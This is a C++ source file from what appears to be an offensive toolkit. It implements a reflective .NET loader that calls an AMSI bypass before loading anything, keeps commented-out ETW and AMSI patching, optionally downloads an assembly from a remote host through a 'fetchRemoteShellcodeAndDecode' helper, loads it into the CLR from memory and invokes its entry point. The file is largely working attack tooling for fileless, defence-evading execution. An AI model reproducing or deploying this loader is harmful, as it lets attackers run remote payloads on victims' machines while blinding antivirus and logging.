#include "dotnet.hpp"
#pragma comment(lib, "mscoree.lib")
#undef GetMessage
#undef Yield
#undef MessageBox

#import <mscorlib.tlb> raw_interfaces_only \
    high_property_prefixes("_get","_put","_putref") \
    rename("ReportEvent", "ClrReportEvent") \
    rename("IAppDomain", "mscorlib_IAppDomain") \
    rename("IHashCodeProvider", "mscorlib_IHashCodeProvider") \
    rename("or", "mscorlib_or")  // <--- Add this line
using namespace mscorlib;

#include <shellapi.h>
#pragma comment(lib, "shell32.lib")

void InitDotnet(std::wstring FilePath, bool isRemote, std::wstring args, bool https) {
	if (isRemote) {
		std::cout << "[+] Remote dotnet execution\n";
		Dotnet(FilePath, args, true, https);
	}
	else {
		std::wcout << "Received argument for initialisation: filePath: " << FilePath << " args: " << args << "\n";
		if (checkFile(FilePath)) {
			std::cout << "[+] File is a valid .NET executable, proceeding with execution\n";
			Dotnet(FilePath, args, false, https);
		}
		else {
			std::cout << "[-] Could not parse file path or file does not exist, exiting\n";
			return;
		};

	}
};

bool checkFile(std::wstring filePath) {
	std::wcout << "[*] Checking if file is a valid .NET executable: " << filePath << "\n";
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::wcout << "[-] Failed to open file: " << filePath << "\n";
        return false;
    };
    HANDLE hMapping = CreateFileMappingW(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    if (!hMapping)
    {
        CloseHandle(hFile);
        return false;
    }

    LPVOID base = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!base)
    {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    bool result = false;

    try
    {
        
        auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
            result = false; // Not a valid PE file

        auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
            reinterpret_cast<BYTE*>(base) + dosHeader->e_lfanew);

        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
            result = false; // Not a valid PE file
        if (ntHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
            std::cout << "[!] Target file is x86 (32-bit)\n";
        }
        else if (ntHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
            std::cout << "[!] Target file is x64 (64-bit)\n";
        }
        // Check if there is a CLR (.NET) header
        const IMAGE_DATA_DIRECTORY& clrDir =
            ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];

        if (clrDir.VirtualAddress != 0 && clrDir.Size != 0)
        {
            result = true; // This is a .NET executable
        }
    }
    catch (...)
    {
        result = false; // Any parsing error means it's not a valid .NET PE
	}
    

    UnmapViewOfFile(base);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    return result;
}

DWORD RvaToOffset(PIMAGE_NT_HEADERS ntHeaders, DWORD rva) {
    auto section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        if (rva >= section->VirtualAddress && rva < (section->VirtualAddress + section->Misc.VirtualSize)) {
            return (rva - section->VirtualAddress) + section->PointerToRawData;
        }
    }
    return 0;
}



std::wstring checkCLRVersion(LPCSTR assmblyBytes, size_t assemblyLength, LPCSTR byteSeq, size_t byteSeqLength) {
    for (size_t _index = 0; _index < assemblyLength; _index++) {
        if (byteSeq[0] == assmblyBytes[_index] && byteSeq[9] == assmblyBytes[_index + 9]
            && byteSeq[2] == assmblyBytes[_index + 2] && byteSeq[6] == assmblyBytes[_index + 6]) {
            return L"v4.0.30319";
        }
    }

    return L"v2.0.50727";
}


SAFEARRAY* setEntrypointParams(LPSTR* arguments, size_t argsCount) {
    VARIANT args;
    args.vt = VT_ARRAY | VT_BSTR;
    SAFEARRAYBOUND argsBound[1];
    argsBound[0].lLbound = 0;
    size_t argsLength = arguments != NULL ? argsCount : 0;
    argsBound[0].cElements = argsLength;
    args.parray = SafeArrayCreate(VT_BSTR, 1, argsBound);
    LONG idx[1];
    for (size_t i = 0; i < argsLength; i++) {
        idx[0] = i;
        SafeArrayPutElement(args.parray, idx, SysAllocString(_bstr_t(arguments[i]).Detach()));
    }
    SAFEARRAY* params = NULL;
    SAFEARRAYBOUND paramsBound[1];
    paramsBound[0].lLbound = 0;
    paramsBound[0].cElements = 1;
    params = SafeArrayCreate(VT_VARIANT, 1, paramsBound);
    idx[0] = 0;
    SafeArrayPutElement(params, idx, &args);

    

    return params;
}
const char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
const char v2[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };

LPSTR* convertArgsToLPSTRArray(std::wstring args, int& argsCount) {
    //converting args from wstring to LPSTR array
    
    LPWSTR* szArglist = CommandLineToArgvW(args.c_str(), &argsCount);

    

    // 2. Prepare the LPSTR* (char**) array
    LPSTR* arguments = new LPSTR[argsCount];

    for (int i = 0; i < argsCount; i++) {
        // Determine required buffer size for conversion
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, szArglist[i], -1, NULL, 0, NULL, NULL);

        // Allocate and convert
        arguments[i] = new char[size_needed];
        WideCharToMultiByte(CP_UTF8, 0, szArglist[i], -1, arguments[i], size_needed, NULL, NULL);
    }
    return arguments;
}


std::vector<char> fetchRemoteEx(std::wstring url, std::wstring file, bool https) {
    std::vector<unsigned char> data =
        helperHandler.fetchRemoteShellcodeAndDecode(url, file, 0x00, https);

    return std::vector<char>(data.begin(), data.end());
};
void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote, bool https) {

    int argsCount = 0;
    SAFEARRAY* params = nullptr;
    LPSTR* arguments = convertArgsToLPSTRArray(args, argsCount);
    //SetupEtwBypass();
    //SetupAMSIBypass();
    if (!FullAmsiBypass()) {
		std::cout << "[-] Failed to bypass AMSI, exiting early\n";
        return;
    };
    std::wcout << L"------- Reflective .NET Loader -------\n";
    /*
    if (!patchRemoteETW(mainInjector.process(-1))) {

        std::cout << "[+] Patched ETW\n";
    }
    else {
        std::cout << "[-] Didnt Patched ETW\n";
    };
    
       if (!patchRemoteAmsi(mainInjector.process(-1))) {
        std::cout << "[+] Patched Amsi\n";
    }
    else {
		std::cout << "[-] Didnt Patched Amsi\n";
    }
    */
    
    
    

    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return;

    ICLRMetaHost* metaHost = nullptr;
    ICLRRuntimeInfo* runtimeInfo = nullptr;
    ICorRuntimeHost* runtimeHost = nullptr; 
    IUnknownPtr pAppDomainUnk = nullptr;
    _AppDomainPtr pDefaultAppDomain = nullptr;
    _AssemblyPtr pAssembly = nullptr;
    _MethodInfoPtr pEntryPoint = nullptr;


    std::vector<char> buffer;
    if (isRemote) {
        size_t pos = FilePath.find(L'/');
        std::wstring url;
        std::wstring path;

        if (pos != std::wstring::npos) {
            url = FilePath.substr(0, pos);
            path = FilePath.substr(pos);
			std::wcout << "[+] Fetching remote assembly from: " << url << " with path: " << path << "\n";
            buffer = fetchRemoteEx(url, path, https);
        }
        else {
            std::wcout << "[-] Invalid remote path format. Expected format: <IP>/<Path>\n";
            return;
        }
    }
    else {
        std::ifstream file(FilePath, std::ios::binary | std::ios::ate);
        if (!file.is_open()) { std::cerr << "Failed to open file.\n"; return; }

        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);

        buffer.resize(size);

        if (!file.read(buffer.data(), size)) {
            return;
        }
    }
    
   
    std::wstring clrVersion = checkCLRVersion(
        buffer.data(),
        buffer.size(),
        v4,
        strlen(v4)
    );
	//std::wcout << "Target .NET Version: " << std::wstring(targetVersion) << "\n\n\n";
    std::wcout << "Target .NET Version: " << clrVersion << std::endl;
    // 2. Setup the Runtime
    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost);
    hr = metaHost->GetRuntime(clrVersion.c_str(), IID_ICLRRuntimeInfo, (LPVOID*)&runtimeInfo);

    // Get ICorRuntimeHost so we can access AppDomains
    hr = runtimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&runtimeHost);
    hr = runtimeHost->Start();

    // 3. Get the Default AppDomain
    hr = runtimeHost->GetDefaultDomain(&pAppDomainUnk);
    hr = pAppDomainUnk->QueryInterface(IID_PPV_ARGS(&pDefaultAppDomain));

    // 4. Prepare the SAFEARRAY for the bytes
    SAFEARRAYBOUND bounds = { (ULONG)buffer.size(), 0 };
    SAFEARRAY* psa = SafeArrayCreate(VT_UI1, 1, &bounds);
    void* pData = nullptr;
    SafeArrayAccessData(psa, &pData);
    memcpy(pData, buffer.data(), buffer.size());
    SafeArrayUnaccessData(psa);

    // 5. Load the Assembly from memory and run Entry Point
    std::cout << "Loading assembly into memory...\n";
    hr = pDefaultAppDomain->Load_3(psa, &pAssembly);
    
    if (FAILED(hr)) { std::cout << "Load_3 failed. HRESULT: 0x" << std::hex << hr << "\n"; goto cleanup; }
	else { std::cout << "Assembly loaded successfully.\n"; }
    hr = pAssembly->get_EntryPoint(&pEntryPoint);
    if (FAILED(hr) || pEntryPoint == nullptr) {
        std::cout << "Could not find Entry Point (Main).\n";
        goto cleanup;
    }

    std::cout << "Invoking Entry Point...\n";
    VARIANT varObj; VariantInit(&varObj); varObj.vt = VT_NULL; VARIANT varArgs; VariantInit(&varArgs); varArgs.vt = VT_NULL;
	
    VARIANT retVal;
    VariantInit(&retVal);
    params = setEntrypointParams(arguments, argsCount);
    std::cout << "converting args to SAFEARRAY...\n";
    hr = pEntryPoint->Invoke_3(varObj, params, &retVal);

cleanup:
    if (psa) SafeArrayDestroy(psa);
    if (runtimeHost) runtimeHost->Release();
    if (runtimeInfo) runtimeInfo->Release();
    if (metaHost) metaHost->Release();
    CoUninitialize();
}